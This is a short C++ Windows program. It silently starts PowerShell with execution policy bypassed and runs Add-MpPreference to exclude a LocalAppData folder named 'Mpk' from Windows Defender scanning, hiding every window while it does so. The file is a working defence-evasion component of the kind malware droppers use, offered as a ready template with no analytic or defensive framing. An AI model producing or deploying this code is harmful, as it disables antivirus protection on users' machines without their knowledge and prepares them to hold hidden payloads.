#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h> // Required for snprintf

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;

    // PowerShell script to execute - modify the content between the quotes
    // This is a C++11 Raw String Literal (R"()") which makes handling quotes easy.
    const char* psScript = R"(
        # Your script to add the AppData exclusion path to Windows Defender
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Mpk"
    )";

    // Build the PowerShell command
    // NOTE: Make sure the buffer size (4096) is large enough for your entire script!
    char command[4096]; 
    snprintf(command, sizeof(command),
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"%s\"",
        psScript);

    // Create process info structures
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Hide the PowerShell window
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Execute PowerShell
    if (CreateProcessA(
        NULL,              // Application name
        command,           // Command line
        NULL,              // Process security attributes
        NULL,              // Thread security attributes
        FALSE,             // Inherit handles
        CREATE_NO_WINDOW,  // Creation flags - no console window
        NULL,              // Environment
        NULL,              // Current directory
        &si,               // Startup info
        &pi                // Process info
    )) {
        // Wait for the script to complete (optional - remove for async)
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}